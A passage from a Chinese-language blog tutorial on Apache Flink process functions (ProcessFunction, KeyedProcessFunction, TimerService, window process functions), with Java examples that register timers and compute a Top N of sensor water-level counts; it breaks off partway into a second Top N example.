process.getSideOutput(ks1LateTag).printToErr(<span class="string">"ks1迟到数据"</span>);</span><br><span class="line">        process.getSideOutput(ks2LateTag).printToErr(<span class="string">"ks2迟到数据"</span>);</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>六、处理函数</h1><p>之前所介绍的流处理API，无论是基本的转换、聚合，还是更为复杂的窗口操作，其实都是基于DataStream进行转换的，所以可以统称为DataStream API。</p><p>在Flink更底层，我们可以不定义任何具体的算子（比如map，filter，或者window），而只是提炼出一个统一的“处理”（process）操作——它是所有转换算子的一个概括性的表达，可以自定义处理逻辑，所以这一层接口就被叫作“处理函数”（process function）</p><p><img src="http://qnypic.shawncoding.top/blog/202404161646761.png" alt></p><h2 id="1、基本处理函数（ProcessFunction）">1、基本处理函数（ProcessFunction）</h2><h3 id="1-1-处理函数的功能和使用">1.1 处理函数的功能和使用</h3><p>处理函数提供了一个“定时服务”（TimerService），我们可以通过它访问流中的事件（event）、时间戳（timestamp）、水位线（watermark），甚至可以注册“定时事件”。而且处理函数继承了AbstractRichFunction抽象类，所以拥有富函数类的所有特性，同样可以访问状态（state）和其他运行时信息。此外，处理函数还可以直接将数据输出到侧输出流（side output）中。所以，处理函数是最为灵活的处理方法，可以实现各种自定义的业务逻辑。</p><p>处理函数的使用与基本的转换操作类似，只需要直接基于DataStream调用.process()方法就可以了。方法需要传入一个ProcessFunction作为参数，用来定义处理逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stream.process(<span class="keyword">new</span> MyProcessFunction())</span><br></pre></td></tr></table></figure><h3 id="1-2-ProcessFunction解析">1.2 ProcessFunction解析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ProcessFunction</span>&lt;<span class="title">I</span>, <span class="title">O</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractRichFunction</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(I value, Context ctx, Collector&lt;O&gt; out)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;O&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>抽象方法.processElement()</strong></p><p>用于“处理元素”，定义了处理的核心逻辑。这个方法对于流中的每个元素都会调用一次，参数包括三个：输入数据值value，上下文ctx，以及“收集器”（Collector）out。方法没有返回值，处理之后的输出数据是通过收集器out来定义的。</p><ul><li>value：当前流中的输入元素，也就是正在处理的数据，类型与流中数据类型一致</li><li>ctx：类型是ProcessFunction中定义的内部抽象类Context，表示当前运行的上下文，可以获取到当前的时间戳，并提供了用于查询时间和注册定时器的“定时服务”（TimerService），以及可以将数据发送到“侧输出流”（side output）的方法.output()</li><li>out：“收集器”（类型为Collector），用于返回输出数据。使用方式与flatMap算子中的收集器完全一样，直接调用out.collect()方法就可以向下游发出一个数据。这个方法可以多次调用，也可以不调用。</li></ul><p><strong>非抽象方法.onTimer()</strong></p><p>定时方法.onTimer()也有三个参数：时间戳（timestamp），上下文（ctx），以及收集器（out）。这里的timestamp是指设定好的触发时间，事件时间语义下当然就是水位线了。另外这里同样有上下文和收集器，所以也可以调用定时服务（TimerService），以及任意输出处理之后的数据。既然有.onTimer()方法做定时触发，我们用ProcessFunction也可以自定义数据按照时间分组、定时触发计算输出结果；这其实就实现了窗口（window）的功能。所以说ProcessFunction其实可以实现一切功能</p><p>注意：在Flink中，只有“按键分区流”KeyedStream才支持设置定时器的操作。</p><h3 id="1-3-处理函数的分类">1.3 处理函数的分类</h3><p>Flink提供了8个不同的处理函数</p><ul><li>ProcessFunction：最基本的处理函数，基于DataStream直接调用.process()时作为参数传入</li><li>KeyedProcessFunction：对流按键分区后的处理函数，基于KeyedStream调用.process()时作为参数传入。要想使用定时器，比如基于KeyedStream</li><li>ProcessWindowFunction：开窗之后的处理函数，也是全窗口函数的代表。基于WindowedStream调用.process()时作为参数传入</li><li>ProcessAllWindowFunction：同样是开窗之后的处理函数，基于AllWindowedStream调用.process()时作为参数传入</li><li>CoProcessFunction：合并（connect）两条流之后的处理函数，基于ConnectedStreams调用.process()时作为参数传入</li><li>ProcessJoinFunction：间隔连接（interval join）两条流之后的处理函数，基于IntervalJoined调用.process()时作为参数传入</li><li>BroadcastProcessFunction：广播连接流处理函数，基于BroadcastConnectedStream调用.process()时作为参数传入。这里的“广播连接流”BroadcastConnectedStream，是一个未keyBy的普通DataStream与一个广播流（BroadcastStream）做连接（conncet）之后的产物</li><li>KeyedBroadcastProcessFunction：按键分区的广播连接流处理函数，同样是基于BroadcastConnectedStream调用.process()时作为参数传入。与BroadcastProcessFunction不同的是，这时的广播连接流，是一个KeyedStream与广播流（BroadcastStream）做连接之后的产物。</li></ul><h2 id="2、按键分区处理函数（KeyedProcessFunction）">2、按键分区处理函数（KeyedProcessFunction）</h2><p>只有在KeyedStream中才支持使用TimerService设置定时器的操作。所以一般情况下，我们都是先做了keyBy分区之后，再去定义处理操作；代码中更加常见的处理函数是KeyedProcessFunction</p><h3 id="2-1-定时器（Timer）和定时服务（TimerService）">2.1 定时器（Timer）和定时服务（TimerService）</h3><p>在.onTimer()方法中可以实现定时处理的逻辑，而它能触发的前提，就是之前曾经注册过定时器、并且现在已经到了触发时间。注册定时器的功能，是通过上下文中提供的“定时服务”来实现的。定时服务与当前运行的环境有关。前面已经介绍过，ProcessFunction的上下文（Context）中提供了.timerService()方法，可以直接返回一个TimerService对象。TimerService是Flink关于时间和定时器的基础服务接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前的处理时间</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">currentProcessingTime</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前的水位线（事件时间）</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">currentWatermark</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册处理时间定时器，当处理时间超过time时触发</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerProcessingTimeTimer</span><span class="params">(<span class="keyword">long</span> time)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册事件时间定时器，当水位线超过time时触发</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerEventTimeTimer</span><span class="params">(<span class="keyword">long</span> time)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除触发时间为time的处理时间定时器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deleteProcessingTimeTimer</span><span class="params">(<span class="keyword">long</span> time)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除触发时间为time的处理时间定时器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deleteEventTimeTimer</span><span class="params">(<span class="keyword">long</span> time)</span></span>;</span><br></pre></td></tr></table></figure><p>六个方法可以分成两大类：基于处理时间和基于事件时间。而对应的操作主要有三个：获取当前时间，注册定时器，以及删除定时器。需要注意，尽管处理函数中都可以直接访问TimerService，不过只有基于KeyedStream的处理函数，才能去调用注册和删除定时器的方法；未作按键分区的DataStream不支持定时器操作，只能获取当前时间。</p><p>TimerService会以键（key）和时间戳为标准，对定时器进行去重；也就是说对于每个key和时间戳，最多只有一个定时器，如果注册了多次，onTimer()方法也将只被调用一次。</p><h3 id="2-2-KeyedProcessFunction案例">2.2 KeyedProcessFunction案例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KeyedProcessTimerDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction())</span><br><span class="line">                .assignTimestampsAndWatermarks(</span><br><span class="line">                        WatermarkStrategy</span><br><span class="line">                                .&lt;WaterSensor&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">3</span>))</span><br><span class="line">                                .withTimestampAssigner((element, ts) -&gt; element.getTs() * <span class="number">1000L</span>)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        KeyedStream&lt;WaterSensor, String&gt; sensorKS = sensorDS.keyBy(sensor -&gt; sensor.getId());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO Process:keyed</span></span><br><span class="line">        SingleOutputStreamOperator&lt;String&gt; process = sensorKS.process(</span><br><span class="line">                <span class="keyword">new</span> KeyedProcessFunction&lt;String, WaterSensor, String&gt;() &#123;</span><br><span class="line">                    <span class="comment">/**</span></span><br><span class="line"><span class="comment">                     * 来一条数据调用一次</span></span><br><span class="line"><span class="comment">                     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">                     * <span class="doctag">@param</span> ctx</span></span><br><span class="line"><span class="comment">                     * <span class="doctag">@param</span> out</span></span><br><span class="line"><span class="comment">                     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(WaterSensor value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                        <span class="comment">//获取当前数据的key</span></span><br><span class="line">                        String currentKey = ctx.getCurrentKey();</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// TODO 1.定时器注册</span></span><br><span class="line">                        TimerService timerService = ctx.timerService();</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 1、事件时间的案例</span></span><br><span class="line">                        Long currentEventTime = ctx.timestamp(); <span class="comment">// 数据中提取出来的事件时间</span></span><br><span class="line">                        timerService.registerEventTimeTimer(<span class="number">5000L</span>);</span><br><span class="line">                        System.out.println(<span class="string">"当前key="</span> + currentKey + <span class="string">",当前时间="</span> + currentEventTime + <span class="string">",注册了一个5s的定时器"</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 2、处理时间的案例</span></span><br><span class="line"><span class="comment">//                        long currentTs = timerService.currentProcessingTime();</span></span><br><span class="line"><span class="comment">//                        timerService.registerProcessingTimeTimer(currentTs + 5000L);</span></span><br><span class="line"><span class="comment">//                        System.out.println("当前key=" + currentKey + ",当前时间=" + currentTs + ",注册了一个5s后的定时器");</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 3、获取 process的 当前watermark</span></span><br><span class="line"><span class="comment">//                        long currentWatermark = timerService.currentWatermark();</span></span><br><span class="line"><span class="comment">//                        System.out.println("当前数据=" + value + ",当前watermark=" + currentWatermark);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        </span><br><span class="line">                        <span class="comment">// 注册定时器： 处理时间、事件时间</span></span><br><span class="line"><span class="comment">//                        timerService.registerProcessingTimeTimer();</span></span><br><span class="line"><span class="comment">//                        timerService.registerEventTimeTimer();</span></span><br><span class="line">                        <span class="comment">// 删除定时器： 处理时间、事件时间</span></span><br><span class="line"><span class="comment">//                        timerService.deleteEventTimeTimer();</span></span><br><span class="line"><span class="comment">//                        timerService.deleteProcessingTimeTimer();</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 获取当前时间进展： 处理时间-当前系统时间，  事件时间-当前watermark</span></span><br><span class="line"><span class="comment">//                        long currentTs = timerService.currentProcessingTime();</span></span><br><span class="line"><span class="comment">//                        long wm = timerService.currentWatermark();</span></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    <span class="comment">/**</span></span><br><span class="line"><span class="comment">                     * TODO 2.时间进展到定时器注册的时间，调用该方法</span></span><br><span class="line"><span class="comment">                     * <span class="doctag">@param</span> timestamp 当前时间进展，就是定时器被触发时的时间</span></span><br><span class="line"><span class="comment">                     * <span class="doctag">@param</span> ctx       上下文</span></span><br><span class="line"><span class="comment">                     * <span class="doctag">@param</span> out       采集器</span></span><br><span class="line"><span class="comment">                     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                        <span class="keyword">super</span>.onTimer(timestamp, ctx, out);</span><br><span class="line">                        String currentKey = ctx.getCurrentKey();</span><br><span class="line"></span><br><span class="line">                        System.out.println(<span class="string">"key="</span> + currentKey + <span class="string">"现在时间是"</span> + timestamp + <span class="string">"定时器触发"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        process.print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、窗口处理函数">3、窗口处理函数</h2><h3 id="3-1-窗口处理函数的使用">3.1 窗口处理函数的使用</h3><p>进行窗口计算，我们可以直接调用现成的简单聚合方法（sum/max/min），也可以通过调用.reduce()或.aggregate()来自定义一般的增量聚合函数（ReduceFunction/AggregateFucntion）；而对于更加复杂、需要窗口信息和额外状态的一些场景，我们还可以直接使用全窗口函数、把数据全部收集保存在窗口内，等到触发窗口计算时再统一处理。窗口处理函数就是一种典型的全窗口函数</p><p>窗口处理函数ProcessWindowFunction的使用与其他窗口函数类似，也是基于WindowedStream直接调用方法就可以，只不过这时调用的是.process()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stream.keyBy( t -&gt; t.f0 )</span><br><span class="line">        .window( TumblingEventTimeWindows.of(Time.seconds(<span class="number">10</span>)) )</span><br><span class="line">        .process(<span class="keyword">new</span> MyProcessWindowFunction())</span><br></pre></td></tr></table></figure><h2 id="4、应用案例——Top-N">4、应用案例——Top N</h2><p>**案例需求：**实时统计一段时间内的出现次数最多的水位。例如，统计最近10秒钟内出现次数最多的两个水位，并且每5秒钟更新一次。我们知道，这可以用一个滑动窗口来实现。于是就需要开滑动窗口收集传感器的数据，按照不同的水位进行统计，而后汇总排序并最终输出前两名。这其实就是著名的“Top N”问题</p><h3 id="4-1-使用ProcessAllWindowFunction">4.1 使用ProcessAllWindowFunction</h3><p>不区分不同水位，而是将所有访问数据都收集起来，统一进行统计计算。所以可以不做keyBy，直接基于DataStream开窗，然后使用全窗口函数ProcessAllWindowFunction来进行处理</p><p>在窗口中可以用一个HashMap来保存每个水位的出现次数，只要遍历窗口中的所有数据，自然就能得到所有水位的出现次数。最后把HashMap转成一个列表ArrayList，然后进行排序、取出前两名输出就可以了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProcessAllWindowTopNDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction())</span><br><span class="line">                .assignTimestampsAndWatermarks(</span><br><span class="line">                        WatermarkStrategy</span><br><span class="line">                                .&lt;WaterSensor&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">3</span>))</span><br><span class="line">                                .withTimestampAssigner((element, ts) -&gt; element.getTs() * <span class="number">1000L</span>)</span><br><span class="line">                );</span><br><span class="line">        <span class="comment">// 最近10秒= 窗口长度， 每5秒输出 = 滑动步长</span></span><br><span class="line">        <span class="comment">// TODO 思路一： 所有数据到一起， 用hashmap存， key=vc，value=count值</span></span><br><span class="line">        sensorDS.windowAll(SlidingEventTimeWindows.of(Time.seconds(<span class="number">10</span>), Time.seconds(<span class="number">5</span>)))</span><br><span class="line">                .process(<span class="keyword">new</span> MyTopNPAWF())</span><br><span class="line">                .print();</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTopNPAWF</span> <span class="keyword">extends</span> <span class="title">ProcessAllWindowFunction</span>&lt;<span class="title">WaterSensor</span>, <span class="title">String</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(Context context, Iterable&lt;WaterSensor&gt; elements, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">// 定义一个hashmap用来存，key=vc，value=count值</span></span><br><span class="line">            Map&lt;Integer, Integer&gt; vcCountMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            <span class="comment">// 1.遍历数据, 统计 各个vc出现的次数</span></span><br><span class="line">            <span class="keyword">for</span> (WaterSensor element : elements) &#123;</span><br><span class="line">                Integer vc = element.getVc();</span><br><span class="line">                <span class="keyword">if</span> (vcCountMap.containsKey(vc)) &#123;</span><br><span class="line">                    <span class="comment">// 1.1 key存在，不是这个key的第一条数据，直接累加</span></span><br><span class="line">                    vcCountMap.put(vc, vcCountMap.get(vc) + <span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 1.2 key不存在，初始化</span></span><br><span class="line">                    vcCountMap.put(vc, <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2.对 count值进行排序: 利用List来实现排序</span></span><br><span class="line">            List&lt;Tuple2&lt;Integer, Integer&gt;&gt; datas = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span> (Integer vc : vcCountMap.keySet()) &#123;</span><br><span class="line">                datas.add(Tuple2.of(vc, vcCountMap.get(vc)));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 对List进行排序，根据count值 降序</span></span><br><span class="line">            datas.sort(<span class="keyword">new</span> Comparator&lt;Tuple2&lt;Integer, Integer&gt;&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Tuple2&lt;Integer, Integer&gt; o1, Tuple2&lt;Integer, Integer&gt; o2)</span> </span>&#123;</span><br><span class="line">                    <span class="comment">// 降序， 后 减 前</span></span><br><span class="line">                    <span class="keyword">return</span> o2.f1 - o1.f1;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3.取出 count最大的2个 vc</span></span><br><span class="line">            StringBuilder outStr = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">            outStr.append(<span class="string">"================================\n"</span>);</span><br><span class="line">            <span class="comment">// 遍历 排序后的 List，取出前2个， 考虑可能List不够2个的情况  ==》 List中元素的个数 和 2 取最小值</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Math.min(<span class="number">2</span>, datas.size()); i++) &#123;</span><br><span class="line">                Tuple2&lt;Integer, Integer&gt; vcCount = datas.get(i);</span><br><span class="line">                outStr.append(<span class="string">"Top"</span> + (i + <span class="number">1</span>) + <span class="string">"\n"</span>);</span><br><span class="line">                outStr.append(<span class="string">"vc="</span> + vcCount.f0 + <span class="string">"\n"</span>);</span><br><span class="line">                outStr.append(<span class="string">"count="</span> + vcCount.f1 + <span class="string">"\n"</span>);</span><br><span class="line">                outStr.append(<span class="string">"窗口结束时间="</span> + DateFormatUtils.format(context.window().getEnd(), <span class="string">"yyyy-MM-dd HH:mm:ss.SSS"</span>) + <span class="string">"\n"</span>);</span><br><span class="line">                outStr.append(<span class="string">"================================\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            out.collect(outStr.toString());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-2-使用KeyedProcessFunction">4.2 使用KeyedProcessFunction </h3><p>我们可以从两个方面去做优化：一是对数据进行按键分区，分别统计vc的出现次数；二是进行增量聚合，得到结果最后再做排序输出。所以，我们可以使用增量聚合函数AggregateFunction进行浏览量的统计，然后结合ProcessWindowFunction排序输出来实现Top N的需求</p><p>具体实现可以分成两步：先对每个vc统计出现次数，然后再将统计结果收集起来，排序输出最终结果。由于最后的排序还是基于每个时间窗口的，输出的统计结果中要包含窗口信息，我们可以输出包含了vc、出现次数（count）以及窗口结束时间的Tuple3。之后先按窗口结束时间分区，然后用KeyedProcessFunction来实现。</p><p>用KeyedProcessFunction来收集数据做排序，这时面对的是窗口聚合之后的数据流，而窗口已经不存在了；我们需要确保能够收集齐所有数据，所以应该在窗口结束时间基础上再“多等一会儿”。具体实现上，可以采用一个延迟触发的事件时间定时器。基于窗口的结束时间来设定延迟，其实并不需要等太久——因为我们是靠水位线的推进来触发定时器，而水位线的含义就是“之前的数据都到齐了”。所以我们只需要设置1毫秒的延迟，就一定可以保证这一点。</p><p>而在等待过程中，之前已经到达的数据应该缓存起来，我们这里用一个自定义的HashMap来进行存储，key为窗口的标记，value为List。之后每来一条数据，就把它添加到当前的HashMap中，并注册一个触发时间为窗口结束时间加1毫秒（windowEnd + 1）的定时器。待到水位线到达这个时间，定时器触发，我们可以保证当前窗口所有vc的统计结果Tuple3都到齐了；于是从HashMap中取出进行排序输出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span 